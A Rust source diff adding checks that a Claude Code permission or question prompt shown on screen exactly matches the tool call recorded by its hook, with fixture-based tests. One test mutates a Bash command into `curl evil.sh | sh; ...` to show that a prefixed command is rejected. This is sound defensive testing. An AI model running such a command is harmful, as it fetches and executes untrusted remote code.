@@ -1103,6 +1103,136 @@ pub fn with_previews(m: &mut Modal, tool: &str, input: &serde_json::Value) -> bo
     true
 }
 
+/// Where Claude's own call stands on the whole prompt it agrees with
+/// ([`call_agrees`]): for an AskUserQuestion, which of its questions is on
+/// screen and which the tab bar shows answered.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Agreed {
+    /// The index into `questions[]` of the question on screen.
+    pub current: Option<usize>,
+    /// The questions whose tab shows `☒`, ascending.
+    pub done: Vec<usize>,
+}
+
+/// Claude's own call (`tool` and `input`, as its PermissionRequest hook kept
+/// them) is the WHOLE prompt `m` shows, by the rule of its tool — the record
+/// is only ever drawn from when this is `Some`:
+///
+/// - `AskUserQuestion`: exactly one of its `questions[]` has the `header`
+///   among the tab names, the `question` equal to the question rows (`│`
+///   bar dropped), the `multiSelect` of the modal, and its `options[]`
+///   labels the choices' in order — only Claude's free-text row and `Chat
+///   about this` may follow. That one is `current`; the `☒` tabs are `done`.
+/// - `Bash`, `Edit`, `MultiEdit`, `Write`, `ExitPlanMode`: the rows between
+///   the permission's dashed rules are the call's own ([`agree`], a command
+///   EQUAL to them).
+///
+/// Any other tool has no check, because the screen never shows its input:
+/// see `docs/` and AGENTS.md. Whitespace is never compared; Claude wraps it.
+pub fn call_agrees(m: &Modal, tool: &str, input: &serde_json::Value) -> Option<Agreed> {
+    if m.harness != provider::CLAUDE.id || m.picker.is_some() {
+        return None;
+    }
+    match (m.kind, tool) {
+        (Kind::Question, "AskUserQuestion") => question_agrees(m, input),
+        (Kind::Permission, "Bash" | "Edit" | "MultiEdit" | "Write" | "ExitPlanMode") => {
+            let (asks, shown) = permission_shown(m)?;
+            agree(&asks, &shown, tool, input, true).then(Agreed::default)
+        }
+        _ => None,
+    }
+}
+
+/// A whole Claude permission's question and the rows it asks about: the
+/// ones between its two dashed rules (a command, a diff, a file's rows, a
+/// plan), and what it asks under them.
+fn permission_shown(m: &Modal) -> Option<(Asks, Vec<String>)> {
+    let dashed = |r: &str| {
+        let t = r.trim();
+        r.len() - r.trim_start().len() <= 2 && t.chars().count() >= 20 && t.chars().all(|c| c == '╌')
+    };
+    let at: Vec<usize> = (0..m.lines.len()).filter(|&i| dashed(&m.lines[i])).collect();
+    let [open, close] = at[..] else { return None };
+    let shown = m.lines[open + 1..close].iter().filter(|r| !r.trim().is_empty()).cloned().collect();
+    if let Some((_, file)) = plan_footer(&m.lines, m.lines.len() - 1) {
+        return Some((Asks::Plan { file: Some(file).filter(|f| !f.is_empty()) }, shown));
+    }
+    let q = m.lines[close + 1..].iter().find(|r| !r.trim().is_empty())?;
+    Some((asks(q.trim())?, shown))
+}
+
+fn question_agrees(m: &Modal, input: &serde_json::Value) -> Option<Agreed> {
+    let squash = |t: &str| t.chars().filter(|c| !c.is_whitespace()).collect::<String>();
+    let text = |v: &serde_json::Value, k: &str| v.get(k).and_then(|x| x.as_str()).map(str::to_string);
+    let qs = input.get("questions")?.as_array()?;
+    // The header row, then the question under it — as the screen draws it.
+    let (header, question) = match &m.shown {
+        Some(s) => (s.header.clone(), s.question.clone()),
+        None => {
+            let head: Vec<&str> = m.head().into_iter().map(str::trim).filter(|t| !t.is_empty()).collect();
+            let (h, q) = head.split_first()?;
+            (h.to_string(), q.iter().map(|r| r.strip_prefix('│').unwrap_or(r).trim()).collect::<Vec<_>>().join(" "))
+        }
+    };
+    if !(header.starts_with(['☐', '☒', '✔']) || (header.starts_with('←') && header.ends_with('→'))) || question.is_empty() {
+        return None;
+    }
+    // The tabs, in order: `☐ Colour`, `☒ Size`; `✔ Submit` is no question's.
+    let mut tabs: Vec<(char, String)> = Vec::new();
+    for c in header.chars() {
+        match c {
+            '☐' | '☒' | '✔' => tabs.push((c, String::new())),
+            _ => {
+                if let Some((_, n)) = tabs.last_mut() {
+                    n.push(c);
+                }
+            }
+        }
+    }
+    let tabs: Vec<(char, String)> =
+        tabs.into_iter().filter(|(c, _)| *c != '✔').map(|(c, n)| (c, squash(&n).trim_end_matches('→').to_string())).collect();
+    let header_of = |q: &serde_json::Value| text(q, "header").map(|h| squash(&h));
+    let same = |q: &serde_json::Value| -> Option<bool> {
+        let opts = q.get("options")?.as_array()?;
+        let tail = m.choices.get(opts.len()..)?;
+        let labelled = opts.iter().zip(&m.choices).all(|(o, c)| {
+            let want = text(o, "label").map(|l| squash(&l));
+            // A wrapped label runs onto the rows under its first.
+            let mut got = squash(&c.label);
+            want.as_deref().is_some_and(|w| {
+                got == w
+                    || c.more.iter().any(|r| {
+                        got.push_str(&squash(r));
+                        got == w
+                    })
+            })
+        });
+        let h = header_of(q)?;
+        Some(
+            !h.is_empty()
+                && tabs.iter().any(|(_, t)| *t == h)
+                && squash(&text(q, "question")?) == squash(&question)
+                && q.get("multiSelect").and_then(|b| b.as_bool()).unwrap_or(false) == m.multi
+                && opts.len() >= 1
+                && labelled
+                && m.choices.len() >= opts.len()
+                && tail.iter().all(|c| c.text == Some(Typing::Field) || squash(&c.label) == "Chataboutthis"),
+        )
+    };
+    let hits: Vec<usize> = (0..qs.len()).filter(|&i| same(&qs[i]) == Some(true)).collect();
+    let [current] = hits[..] else { return None };
+    let mut done = Vec::new();
+    for (mark, name) in &tabs {
+        let by_name: Vec<usize> = (0..qs.len()).filter(|&i| header_of(&qs[i]).as_deref() == Some(name.as_str())).collect();
+        if let (true, [i]) = (*mark == '☒', &by_name[..]) {
+            done.push(*i);
+        }
+    }
+    done.sort_unstable();
+    done.dedup();
+    Some(Agreed { current: Some(current), done })
+}
+
 /// Whether `m`'s notes field has the keyboard in the terminal: its arrows
 /// type there and Enter sends the question, so no row answers it then.
 pub fn notes_open(m: &Modal) -> bool {
@@ -1733,80 +1863,89 @@ impl Clipped {
     /// added and removed rows inside its new and old text, the command's
     /// tail, the plan's head). Anything else, or a doubt, is no.
     pub fn agrees(&self, tool: &str, input: &serde_json::Value) -> bool {
-        let text = |k: &str| input.get(k).and_then(|v| v.as_str());
-        let named = |name: &str, path: Option<&str>| {
-            path.is_some_and(|p| {
-                let (p, n) = (std::path::Path::new(p), std::path::Path::new(name));
-                n.components().count() > 0 && p.ends_with(n)
-            })
-        };
-        match &self.asks {
-            Asks::Edit { name } => {
-                let (new, old): (Vec<&str>, Vec<&str>) = match tool {
-                    "Edit" => (text("new_string").into_iter().collect(), text("old_string").into_iter().collect()),
-                    "MultiEdit" => {
-                        let edits = input.get("edits").and_then(|e| e.as_array()).map(Vec::as_slice).unwrap_or_default();
-                        let field = |k: &str| edits.iter().filter_map(|e| e.get(k)?.as_str()).collect();
-                        (field("new_string"), field("old_string"))
-                    }
-                    "Write" => (text("content").into_iter().collect(), Vec::new()),
-                    _ => return false,
-                };
-                named(name, text("file_path")) && !new.is_empty() && self.diff_in(&new, (tool != "Write").then_some(&old[..]))
-            }
-            Asks::Create { name } => {
-                let content: Vec<&str> = text("content").into_iter().collect();
-                tool == "Write" && named(name, text("file_path")) && !content.is_empty() && self.diff_in(&content, None)
-            }
-            Asks::Proceed => {
-                let squash = |s: &str| s.chars().filter(|c| !c.is_whitespace()).collect::<String>();
-                // Claude 2.1.316 draws a multi-row command with a `│` gutter.
-                let seen = self
-                    .shown
-                    .iter()
-                    .map(|r| {
-                        let t = r.trim_start();
-                        t.strip_prefix('│').unwrap_or(t)
-                    })
-                    .collect::<String>();
-                let seen = squash(&seen);
-                tool == "Bash" && !seen.is_empty() && text("command").is_some_and(|c| squash(c).ends_with(&seen))
-            }
-            Asks::Plan { file } => {
-                // Claude renders the plan's markdown (`#`, backticks, bullets),
-                // so the plan is compared by its letters and digits alone.
-                let words = |s: &str| s.chars().filter(|c| c.is_alphanumeric()).collect::<String>();
-                let seen = words(&self.shown.concat());
-                let same_file = match (file, text("planFilePath")) {
-                    (Some(f), Some(p)) => {
-                        let base = |s: &str| std::path::Path::new(s).file_name().map(|n| n.to_os_string());
-                        base(f).is_some() && base(f) == base(p)
-                    }
-                    (None, _) => true,
-                    (Some(_), None) => false,
-                };
-                tool == "ExitPlanMode" && same_file && !seen.is_empty() && text("plan").is_some_and(|p| words(p).starts_with(&seen))
-            }
+        agree(&self.asks, &self.shown, tool, input, false)
+    }
+}
+
+/// [`Clipped::agrees`]'s rule over the rows `shown` of what `asks` asks. A
+/// `whole` prompt (one [`read`] reads) shows its command or plan from the
+/// start, so a Bash command must EQUAL the rows, where a clipped one's ends
+/// with them.
+fn agree(asks: &Asks, shown: &[String], tool: &str, input: &serde_json::Value, whole: bool) -> bool {
+    let text = |k: &str| input.get(k).and_then(|v| v.as_str());
+    let named = |name: &str, path: Option<&str>| {
+        path.is_some_and(|p| {
+            let (p, n) = (std::path::Path::new(p), std::path::Path::new(name));
+            n.components().count() > 0 && p.ends_with(n)
+        })
+    };
+    match asks {
+        Asks::Edit { name } => {
+            let (new, old): (Vec<&str>, Vec<&str>) = match tool {
+                "Edit" => (text("new_string").into_iter().collect(), text("old_string").into_iter().collect()),
+                "MultiEdit" => {
+                    let edits = input.get("edits").and_then(|e| e.as_array()).map(Vec::as_slice).unwrap_or_default();
+                    let field = |k: &str| edits.iter().filter_map(|e| e.get(k)?.as_str()).collect();
+                    (field("new_string"), field("old_string"))
+                }
+                "Write" => (text("content").into_iter().collect(), Vec::new()),
+                _ => return false,
+            };
+            named(name, text("file_path")) && !new.is_empty() && diff_in(shown, &new, (tool != "Write").then_some(&old[..]))
+        }
+        Asks::Create { name } => {
+            let content: Vec<&str> = text("content").into_iter().collect();
+            tool == "Write" && named(name, text("file_path")) && !content.is_empty() && diff_in(shown, &content, None)
+        }
+        Asks::Proceed => {
+            let squash = |s: &str| s.chars().filter(|c| !c.is_whitespace()).collect::<String>();
+            // Claude 2.1.316 draws a multi-row command with a `│` gutter.
+            let seen = shown
+                .iter()
+                .map(|r| {
+                    let t = r.trim_start();
+                    t.strip_prefix('│').unwrap_or(t)
+                })
+                .collect::<String>();
+            let seen = squash(&seen);
+            tool == "Bash"
+                && !seen.is_empty()
+                && text("command").is_some_and(|c| if whole { squash(c) == seen } else { squash(c).ends_with(&seen) })
+        }
+        Asks::Plan { file } => {
+            // Claude renders the plan's markdown (`#`, backticks, bullets),
+            // so the plan is compared by its letters and digits alone.
+            let words = |s: &str| s.chars().filter(|c| c.is_alphanumeric()).collect::<String>();
+            let seen = words(&shown.concat());
+            let same_file = match (file, text("planFilePath")) {
+                (Some(f), Some(p)) => {
+                    let base = |s: &str| std::path::Path::new(s).file_name().map(|n| n.to_os_string());
+                    base(f).is_some() && base(f) == base(p)
+                }
+                (None, _) => true,
+                (Some(_), None) => false,
+            };
+            tool == "ExitPlanMode" && same_file && !seen.is_empty() && text("plan").is_some_and(|p| words(p).starts_with(&seen))
         }
     }
+}
 
-    /// Every added row of the diff on screen is in one of `new`. An edit's
-    /// removed rows are in one of its `old`, and its context rows are the
-    /// file's; a Write (`old` is `None`) has no old text to check, and its
-    /// preview's rows, which carry no `+`, are all its content. A row cut with
-    /// `…` is compared up to the cut, and a row with no line number continues
-    /// a wrapped one.
-    fn diff_in(&self, new: &[&str], old: Option<&[&str]>) -> bool {
-        self.shown.iter().filter_map(|r| diff_row(r)).all(|(mark, line)| {
-            let line = line.strip_suffix('…').unwrap_or(line).trim_end();
-            let within = |texts: &[&str]| texts.iter().any(|t| t.contains(line));
-            match (mark, old) {
-                ('+', _) | (' ', None) => within(new),
-                ('-', Some(old)) => within(old),
-                _ => true,
-            }
-        })
-    }
+/// Every added row of the diff in `shown` is in one of `new`. An edit's
+/// removed rows are in one of its `old`, and its context rows are the
+/// file's; a Write (`old` is `None`) has no old text to check, and its
+/// preview's rows, which carry no `+`, are all its content. A row cut with
+/// `…` is compared up to the cut, and a row with no line number continues
+/// a wrapped one.
+fn diff_in(shown: &[String], new: &[&str], old: Option<&[&str]>) -> bool {
+    shown.iter().filter_map(|r| diff_row(r)).all(|(mark, line)| {
+        let line = line.strip_suffix('…').unwrap_or(line).trim_end();
+        let within = |texts: &[&str]| texts.iter().any(|t| t.contains(line));
+        match (mark, old) {
+            ('+', _) | (' ', None) => within(new),
+            ('-', Some(old)) => within(old),
+            _ => true,
+        }
+    })
 }
 
 /// A diff or preview row, ` 32 +row 32 changed` / `  1 hello`: its mark
@@ -4723,5 +4862,175 @@ mod tests {
         assert_eq!(claude(&beside), None, "a row beside the choices that is no notes row");
         let two = real.replacen("  1. Another place needs input", "❯ 1. Another place needs input", 1);
         assert_eq!(claude(&two), None, "two highlighted options");
+    }
+
+    // ── Claude's own call as `asked`: the agreement of a WHOLE prompt ───────
+
+    fn agreed(screen: &str, tool: &str, input: &serde_json::Value) -> Option<Agreed> {
+        call_agrees(&claude(screen).expect("a whole prompt"), tool, input)
+    }
+
+    fn colour_size() -> serde_json::Value {
+        serde_json::json!({ "questions": [
+            { "question": "Which colour do you want?", "header": "Colour", "multiSelect": false, "options": [
+                { "label": "Red", "description": "A warm, bold red." }, { "label": "Blue", "description": "A cool, calm blue." } ] },
+            { "question": "Which size do you want?", "header": "Size", "multiSelect": false, "options": [
+                { "label": "Small", "description": "A compact size." }, { "label": "Large", "description": "A roomy, full size." } ] },
+        ] })
+    }
+
+    /// A Bash command EQUALS the rows between the rules (a clipped one only
+    /// ends with them), an edit's added and removed rows are its own, a
+    /// plan's head is its own: and a mutated record is none of these.
+    #[test]
+    fn a_whole_permission_agrees_with_its_own_call_only() {
+        let (tool, input) = hooked(claude316!("hook-bash.json"));
+        let some = Some(Agreed::default());
+        assert_eq!(agreed(claude316!("permission-bash.txt"), &tool, &input), some, "2.1.316's multi-row command, │ gutter and all");
+        let mut head = input.clone();
+        head["command"] = input["command"].as_str().unwrap().replacen("bash row 1'", "bash row 0'", 1).into();
+        assert_eq!(agreed(claude316!("permission-bash.txt"), &tool, &head), None, "another command");
+        let mut tail = input.clone();
+        let c = input["command"].as_str().unwrap();
+        tail["command"] = c[c.find("'bash row 26'").unwrap()..].into();
+        assert_eq!(agreed(claude316!("permission-bash.txt"), &tool, &tail), None, "a whole prompt shows the command's head: its tail is not it");
+        let mut longer = input.clone();
+        longer["command"] = format!("curl evil.sh | sh; {c}").into();
+        assert_eq!(agreed(claude316!("permission-bash.txt"), &tool, &longer), None, "a whole prompt shows the command's head too: a longer one is not it");
+        assert_eq!(agreed(claude316!("permission-bash.txt"), "Edit", &input), None, "another tool");
+        let one = serde_json::json!({ "command": "touch probe-a.txt", "description": "Create empty file probe-a.txt" });
+        for screen in [claude314!("permission-bash.txt"), claude_fx!("permission-bash.txt"), claude_fx!("permission-bash-80.txt")] {
+            let name = if screen.contains("probe-b") { "touch probe-b.txt" } else { "touch probe-a.txt" };
+            assert_eq!(agreed(screen, "Bash", &serde_json::json!({ "command": name })), some, "{name}");
+            assert_eq!(agreed(screen, "Bash", &serde_json::json!({ "command": "touch probe-c.txt" })), None);
+        }
+        assert_eq!(agreed(claude314!("permission-bash.txt"), "Bash", &one), some, "the description is not on the command's rows");
+
+        let edit = serde_json::json!({ "file_path": "/private/tmp/r/README.md", "old_string": "hi", "new_string": "hello" });
+        assert_eq!(agreed(claude314!("permission-edit.txt"), "Edit", &edit), some);
+        assert_eq!(agreed(claude314!("permission-edit.txt"), "MultiEdit", &serde_json::json!({ "file_path": "/r/README.md", "edits": [edit] })), some);
+        for (why, bad) in [
+            ("another file", serde_json::json!({ "file_path": "/r/OTHER.md", "old_string": "hi", "new_string": "hello" })),
+            ("another new text", serde_json::json!({ "file_path": "/r/README.md", "old_string": "hi", "new_string": "bye" })),
+            ("another old text", serde_json::json!({ "file_path": "/r/README.md", "old_string": "yo", "new_string": "hello" })),
+            ("no input", serde_json::json!({})),
+        ] {
+            assert_eq!(agreed(claude314!("permission-edit.txt"), "Edit", &bad), None, "{why}");
+        }
+        let write = serde_json::json!({ "file_path": "/r/notes.txt", "content": "hello from the probe" });
+        assert_eq!(agreed(claude314!("permission-write.txt"), "Write", &write), some);
+        assert_eq!(agreed(claude314!("permission-write.txt"), "Write", &serde_json::json!({ "file_path": "/r/notes.txt", "content": "else" })), None);
+        assert_eq!(agreed(claude314!("permission-write.txt"), "Write", &serde_json::json!({ "file_path": "/r/other.txt", "content": "hello from the probe" })), None);
+        assert_eq!(agreed(claude314!("permission-write.txt"), "Edit", &write), None, "a Write is not an Edit");
+
+        let (tool, plan) = hooked(claude316!("hook-exit-plan-80.json"));
+        assert_eq!(agreed(claude316!("plan-approval-80.txt"), &tool, &plan), some);
+        let mut other = plan.clone();
+        other["planFilePath"] = "/Users/u/.claude/plans/another-plan.md".into();
+        assert_eq!(agreed(claude316!("plan-approval-80.txt"), &tool, &other), None, "another plan's file");
+        let mut revised = plan.clone();
+        revised["plan"] = plan["plan"].as_str().unwrap().replacen("Plan", "Scheme", 1).into();
+        assert_eq!(agreed(claude316!("plan-approval-80.txt"), &tool, &revised), None, "another plan");
+    }
+
+    /// An MCP tool's input is never on the screen, so nothing can agree with
+    /// it: no check, no `asked` (AGENTS.md says why).
+    #[test]
+    fn a_tool_whose_input_the_screen_never_shows_has_no_agreement() {
+        let m = claude(claude314!("permission-mcp.txt")).unwrap();
+        for tool in ["mcp__worktrees__list_places", "WebFetch", "WebSearch", "NotebookEdit", "Task"] {
+            assert_eq!(call_agrees(&m, tool, &serde_json::json!({ "url": "x", "query": "x" })), None, "{tool}");
+        }
+    }
+
+    /// A question agrees when one of the call's questions is the one on
+    /// screen in all four ways; `current` is that one and `done` the ☒ tabs.
+    #[test]
+    fn a_question_agrees_by_header_text_kind_and_labels_and_says_which() {
+        let call = colour_size();
+        assert_eq!(agreed(claude314!("question-two.txt"), "AskUserQuestion", &call), Some(Agreed { current: Some(0), done: vec![] }));
+        assert_eq!(agreed(claude314!("question-two-second.txt"), "AskUserQuestion", &call), Some(Agreed { current: Some(1), done: vec![0] }));
+        let single = serde_json::json!({ "questions": [{ "question": "Which topic should I write a joke about?", "header": "Joke topic", "multiSelect": false,
+            "options": [{ "label": "Programming" }, { "label": "Cats" }, { "label": "Coffee" }] }] });
+        assert_eq!(agreed(claude314!("question.txt"), "AskUserQuestion", &single), Some(Agreed { current: Some(0), done: vec![] }));
+        let toppings = serde_json::json!({ "questions": [{ "question": "Which toppings do you want on a pizza?", "header": "Toppings", "multiSelect": true,
+            "options": [{ "label": "Cheese" }, { "label": "Olives" }, { "label": "Mushrooms" }] }] });
+        assert_eq!(agreed(claude314!("question-multiselect.txt"), "AskUserQuestion", &toppings), Some(Agreed { current: Some(0), done: vec![] }));
+        // A form with a multi-select first: its second question, the first answered.
+        let form = serde_json::json!({ "questions": [toppings["questions"][0].clone(), call["questions"][1].clone()] });
+        let first = include_str!("../tests/fixtures/claude-screen/2.1.316/form-multiselect/first.txt");
+        let second = include_str!("../tests/fixtures/claude-screen/2.1.316/form-multiselect/second.txt");
+        assert_eq!(agreed(first, "AskUserQuestion", &form), Some(Agreed { current: Some(0), done: vec![] }));
+        assert_eq!(agreed(second, "AskUserQuestion", &form), Some(Agreed { current: Some(1), done: vec![0] }));
+        // A preview question: Claude's box beside the list; the call has the previews.
+        let two = hook(preview!("hook-two.json"));
+        assert_eq!(agreed(preview!("two-1.txt"), "AskUserQuestion", &two), Some(Agreed { current: Some(0), done: vec![] }));
+        assert_eq!(agreed(preview!("two-2-large.txt"), "AskUserQuestion", &two), Some(Agreed { current: Some(1), done: vec![0] }));
+
+        let mutate = |f: &dyn Fn(&mut serde_json::Value)| {
+            let mut c = call.clone();
+            f(&mut c);
+            agreed(claude314!("question-two.txt"), "AskUserQuestion", &c)
+        };
+        assert_eq!(mutate(&|c| c["questions"][0]["header"] = "Shade".into()), None, "a header not among the tabs");
+        assert_eq!(mutate(&|c| c["questions"][0]["question"] = "Which shade do you want?".into()), None, "another question");
+        assert_eq!(mutate(&|c| c["questions"][0]["multiSelect"] = true.into()), None, "another kind");
+        assert_eq!(mutate(&|c| c["questions"][0]["options"][1]["label"] = "Green".into()), None, "another label");
+        assert_eq!(mutate(&|c| c["questions"][0]["options"] = serde_json::json!([{ "label": "Red" }])), None, "fewer options: Blue is no free-text row");
+        assert_eq!(mutate(&|c| { c["questions"][0]["options"].as_array_mut().unwrap().push(serde_json::json!({ "label": "Green" })); }), None, "more options");
+        assert_eq!(mutate(&|c| c["questions"] = serde_json::json!([c["questions"][1].clone()])), None, "only the other question");
+        let twin = serde_json::json!({ "questions": [call["questions"][0].clone(), call["questions"][0].clone()] });
+        assert_eq!(agreed(claude314!("question-two.txt"), "AskUserQuestion", &twin), None, "two questions that are the one on screen: no guess");
+        assert_eq!(agreed(claude314!("question-two.txt"), "Bash", &call), None, "another tool");
+        assert_eq!(agreed(claude314!("question-two-review.txt"), "AskUserQuestion", &call), None, "the review screen is no question of the call");
+    }
+
+    macro_rules! claude319 {
+        ($name:literal) => {
+            include_str!(concat!("../tests/fixtures/claude-screen/2.1.319/", $name))
+        };
+    }
+
+    /// Claude 2.1.319, captured as worktrees launches it (`--name`) with its
+    /// own PermissionRequest hook beside: the call the hook kept is the
+    /// prompt on screen, tool by tool — and a mutated call is not.
+    #[test]
+    fn claude_2_1_319_prompts_agree_with_their_own_hook_records() {
+        let some = Some(Agreed::default());
+        let (tool, bash) = hooked(claude319!("hook-bash.json"));
+        assert_eq!(agreed(claude319!("permission-bash.txt"), &tool, &bash), some);
+        assert_eq!(agreed(claude319!("permission-bash.e.txt"), &tool, &bash), some, "the styled capture reads the same");
+        let mut other = bash.clone();
+        other["command"] = bash["command"].as_str().unwrap().replace("pc.txt", "pd.txt").into();
+        assert_eq!(agreed(claude319!("permission-bash.txt"), &tool, &other), None);
+
+        let (tool, edit) = hooked(claude319!("hook-edit.json"));
+        assert_eq!(agreed(claude319!("permission-edit.txt"), &tool, &edit), some);
+        let mut other = edit.clone();
+        other["new_string"] = "howdy".into();
+        assert_eq!(agreed(claude319!("permission-edit.txt"), &tool, &other), None);
+        other = edit.clone();
+        other["file_path"] = "/private/tmp/claude-501/wtask/repo/OTHER.md".into();
+        assert_eq!(agreed(claude319!("permission-edit.txt"), &tool, &other), None);
+
+        let (tool, call) = hooked(claude319!("hook-question.json"));
+        assert_eq!(agreed(claude319!("question-first.txt"), &tool, &call), Some(Agreed { current: Some(0), done: vec![] }));
+        assert_eq!(agreed(claude319!("question-second.txt"), &tool, &call), Some(Agreed { current: Some(1), done: vec![0] }));
+        let mut other = call.clone();
+        other["questions"][1]["options"][1]["label"] = "Huge".into();
+        assert_eq!(agreed(claude319!("question-second.txt"), &tool, &other), None);
+    }
+
+    /// A WebFetch prompt (2.1.319, a sub-agent's) has no key hints and no
+    /// numbered footer the readers know: it reads as nothing, whole or
+    /// clipped, so there is nothing to attach a call to — and the URL on
+    /// screen (`https://example.com/`) is not the call's (`https://example.com`).
+    #[test]
+    fn a_webfetch_prompt_is_not_read_and_its_url_is_not_the_calls() {
+        let t = claude319!("permission-webfetch.txt");
+        assert!(claude(t).is_none() && clipped("claude", t).is_none());
+        let (tool, call) = hooked(claude319!("hook-webfetch.json"));
+        assert_eq!((tool.as_str(), call["url"].as_str()), ("WebFetch", Some("https://example.com")));
+        assert!(t.contains(" url: https://example.com/\n"));
     }
 }
